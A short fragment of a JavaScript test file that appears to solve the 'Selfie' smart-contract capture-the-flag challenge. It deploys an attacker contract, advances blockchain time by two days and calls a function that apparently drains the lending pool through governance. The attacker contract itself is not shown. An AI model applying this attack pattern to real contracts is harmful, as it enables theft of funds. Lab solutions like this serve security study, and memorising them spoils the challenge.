...
describe("[Challenge] Selfie", function () {
  ...
  it("Exploit", async function () {
    ...
    const killerFactory = await ethers.getContractFactory(
      "SelfieKiller",
      attacker
    )
    const killer = await killerFactory.deploy(
      this.pool.address,
      this.token.address,
      this.governance.address
    )
    await killer.initiateMurder()
    await ethers.provider.send("evm_increaseTime", [60 * 60 * 24 * 2])
    await killer.drainDrainGoAwayComeAgainAnotherDay()
  })
